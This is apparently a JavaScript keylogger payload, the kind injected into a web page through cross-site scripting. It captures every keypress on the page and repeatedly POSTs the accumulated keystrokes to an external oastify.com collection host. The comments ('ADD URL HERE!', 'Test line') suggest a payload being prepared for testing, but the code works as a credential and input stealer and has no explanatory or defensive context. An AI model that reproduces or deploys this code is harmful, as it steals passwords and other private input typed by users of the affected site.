var l = "";   // empty string to concatenate keys onto
document.onkeypress = function (e) {
        l += e.key;
        console.log(l);  //Test line
        var req = new XMLHttpRequest();
        req.open("POST","http://rjezjxd6xacjl5achwqjk4217sdj19py.oastify.com", true); 	// ADD URL HERE!
        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        req.send("data=" + l);
}
